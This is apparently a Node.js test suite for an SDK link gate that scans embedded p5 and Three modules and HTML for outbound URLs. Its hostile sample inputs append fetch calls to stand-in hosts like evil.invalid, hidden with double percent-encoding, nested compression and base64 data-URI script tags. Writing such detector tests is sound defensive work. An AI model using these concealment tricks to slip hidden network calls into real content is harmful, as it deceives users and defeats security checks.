import test from 'node:test';
import assert from 'node:assert/strict';
import {readFile,cp,mkdtemp,symlink,rm,copyFile} from 'node:fs/promises';
import {tmpdir} from 'node:os';
import path from 'node:path';
import {fileURLToPath,pathToFileURL} from 'node:url';
import {createHash} from 'node:crypto';
import {gzipSync,brotliCompressSync,deflateRawSync} from 'node:zlib';
import {scanKeelLinkGate,enforceKeelLinkGate} from '../packages/sdk/dist/link-gate.js';
import {KEEL_CREATIVE_RUNTIME_CATALOG} from '../packages/sdk/dist/creative-runtime-catalog.js';
import {buildKeelInlineModuleFragment,buildKeelInlineShellFragments,buildKeelInlineLocalDocument,buildKeelInlineRawPercentTokenURIGraph} from '../packages/sdk/dist/inline-viewer-graph.js';
const root=new URL('../',import.meta.url),utf8=s=>Buffer.from(s),sha=b=>'0x'+createHash('sha256').update(b).digest('hex');
const scan=bytes=>scanKeelLinkGate({route:'native-slot-regression',resources:[{id:'source',bytes}]});
const moduleBytes=async id=>{const profile=KEEL_CREATIVE_RUNTIME_CATALOG.flatMap(x=>x.resources).find(x=>x.id===id);assert.ok(profile);const bytes=await readFile(new URL(profile.localPath,root));assert.equal(sha(bytes),profile.integrity.digest);assert.equal(bytes.length,profile.integrity.byteLength);return{profile,bytes};};
const fragment=async id=>{const {profile,bytes}=await moduleBytes(id);return buildKeelInlineModuleFragment({moduleId:id,version:profile.version,mediaType:profile.mediaType,decodedBytes:bytes,compression:'none',execution:id.startsWith('p5')?'classic':'module'});};

test('actual p5 percent context maps both original child boundaries together',async()=>{
 const {bytes}=await moduleBytes('p5-1-11-3'),needle='http://a/c%20d',at=bytes.indexOf(needle);assert.ok(at>128);
 const source=Buffer.concat([utf8('%41'.repeat(200)+';'),bytes.subarray(at-128,at+needle.length+128)]);
 assert.equal(scan(source).status,'clear');
 const changed=Buffer.concat([source,utf8(';fetch("https://evil.invalid/adjacent")')]);
 assert.ok(scan(changed).hits.some(h=>h.url==='https://evil.invalid/adjacent'));
});

test('actual pinned p5 and Three storedText survive real JSON and double-percent serialization',async()=>{
 for(const id of ['p5-1-11-3','three-r180-core']){
  const f=await fragment(id);
  for(const source of [f.bytes,utf8(encodeURIComponent(encodeURIComponent(Buffer.from(f.bytes).toString('utf8'))))]){
   const report=scan(source);assert.equal(report.status,'clear',id);assert.deepEqual(report.coverage.uninspected,[]);
  }
 }
});

test('pinned slot spans preserve Unicode offsets and inspect every sibling and changed body',async()=>{
 const {bytes}=await moduleBytes('p5-1-11-3'),storedText=bytes.toString('utf8');
 const body={label:'雪🙂',embedded:{compression:'none',storedText}};
 for(const sibling of ['%41','\\u0041'])assert.equal(scan(utf8(JSON.stringify({...body,sibling}))).status,'clear');
 const evil='https://evil.invalid/payload';
 for(const value of [
  {...body,tail:encodeURIComponent(encodeURIComponent('fetch("'+evil+'")'))},
  {...body,embedded:{...body.embedded,extra:evil}},
  {...body,embedded:{...body.embedded,storedText:storedText+';fetch("'+evil+'")'}},
  {...body,embedded:{...body.embedded,storedText:storedText.slice(0,-1)+';fetch("'+evil+'")'}},
  {id:'p5-1-11-3',digest:sha(bytes),embedded:{compression:'none',storedText:'fetch("'+evil+'")'}},
 ]){const report=scan(utf8(JSON.stringify(value)));assert.equal(report.status,'blocked');assert.ok(report.hits.some(h=>h.url===evil));}
 // A genuine unknown nested codec remains incomplete; a valid neighbor grants no extra depth.
 let packed=utf8('fetch("'+evil+'")');for(let n=0;n<8;n++)packed=gzipSync(packed);
 const incomplete=scan(utf8(JSON.stringify({...body,other:{compression:'gzip',storedBase64:packed.toString('base64')}})));
 assert.equal(incomplete.status,'blocked');assert.ok(incomplete.coverage.uninspected.some(x=>x.includes('nesting bound')));
});

test('actual complete canonical p5 and Three prepared streams pass without raising inspection bounds',async()=>{
 const shell=await buildKeelInlineShellFragments({codecProfile:'native'});
 for(const id of ['p5-1-11-3','three-r180-core']){
  const module=await fragment(id);
  const doc=await buildKeelInlineLocalDocument({shell,modules:[module],entry:{id:'art.html',mediaType:'text/html',source:utf8('<canvas id="art"></canvas>'),compression:'none'}});
  const graph=await buildKeelInlineRawPercentTokenURIGraph(doc);
  for(const part of graph.parts.filter(p=>p.role==='module')){const r=await enforceKeelLinkGate({route:'selective-encoded-module',resources:[{id,bytes:part.bytes}]});assert.equal(r.status,'clear');assert.deepEqual(r.coverage.uninspected,[]);}
  const report=await enforceKeelLinkGate({route:'complete-native-stream',resources:[{id,bytes:graph.fragmentBytes}]});
  assert.equal(report.status,'clear');assert.deepEqual(report.coverage.uninspected,[]);
  const evil='https://evil.invalid/after-module';
  const extra=Buffer.concat([graph.fragmentBytes,utf8(encodeURIComponent(encodeURIComponent(';fetch("'+evil+'")')))]);
  const blocked=scan(extra);assert.equal(blocked.status,'blocked');assert.ok(blocked.hits.some(h=>h.url===evil));
  const second='data:text/javascript;base64,'+gzipSync(utf8('fetch(\"'+evil+'\")')).toString('base64');
  const carrier=Buffer.concat([graph.fragmentBytes,utf8(encodeURIComponent(encodeURIComponent('<script src=\"'+second+'\"></script>')))]);
  assert.ok(scan(carrier).hits.some(h=>h.url===evil),'a data URI after the pinned body must still be opened');
 }
});


test('owned HTML arrays retain mandatory declared-codec inspection',()=>{
 const evil='https://hidden.invalid/script.js',source=utf8('fetch("'+evil+'")');
 for(const [compression,compress]of [['brotli',brotliCompressSync],['deflate',deflateRawSync]]){
  const slot={embedded:{compression,storedBase64:compress(source).toString('base64')}};
  for(const text of ['<script>globalThis.__KEEL_ITEMS__='+JSON.stringify([null,slot])+';</script>',encodeURIComponent(encodeURIComponent('<script>globalThis.__KEEL_ITEMS__='+JSON.stringify([null,slot])+';</script>'))]){
   const report=scan(utf8(text));assert.equal(report.status,'blocked');assert.ok(report.hits.some(h=>h.url===evil));
  }
 }
 for(const embedded of [{compression:'brotli',storedBase64:'invalid*'},{compression:'unavailable-codec',storedBase64:Buffer.from(source).toString('base64')}]){
  const report=scan(utf8('<script>globalThis.__KEEL_ITEMS__='+JSON.stringify([null,{embedded}])+';</script>'));assert.equal(report.status,'blocked');assert.ok(report.coverage.uninspected.length);
 }
});


test('installed SDK layout loads canonical gate assets without a checkout',async()=>{
 const directory=await mkdtemp(path.join(tmpdir(),'keel-installed-gate-'));
 try{
  await cp(new URL('../packages/sdk/dist/',import.meta.url),path.join(directory,'dist'),{recursive:true});
  await copyFile(new URL('../packages/sdk/package.json',import.meta.url),path.join(directory,'package.json'));
  // Reuse dependency installation only; no examples or repository tree is copied.
  await symlink(fileURLToPath(new URL('../packages/sdk/node_modules',import.meta.url)),path.join(directory,'node_modules'),'dir');
  const installed=await import(pathToFileURL(path.join(directory,'dist/link-gate.js')).href);
  const infrastructure=await installed.loadKeelLinkGateInfrastructure();
  for(const id of ['keel.published-view-reader','keel.verification-chrome','keel.verification-shell.prefix','keel.verification-shell.suffix'])assert.ok(infrastructure.some(r=>r.id===id),id);
  const shell=await buildKeelInlineShellFragments({codecProfile:'native'});
  const report=await installed.enforceKeelLinkGate({route:'installed-layout',resources:[{id:'registered-suffix',bytes:shell.suffix.bytes}]});assert.equal(report.status,'clear');
  const evil='https://evil.invalid/installed-tail';
  await assert.rejects(installed.enforceKeelLinkGate({route:'installed-layout',resources:[{id:'creator',bytes:utf8('<a href="'+evil+'">x</a>')}]}),e=>e.report.hits.some(h=>h.url===evil));
 }finally{await rm(directory,{recursive:true,force:true});}
});
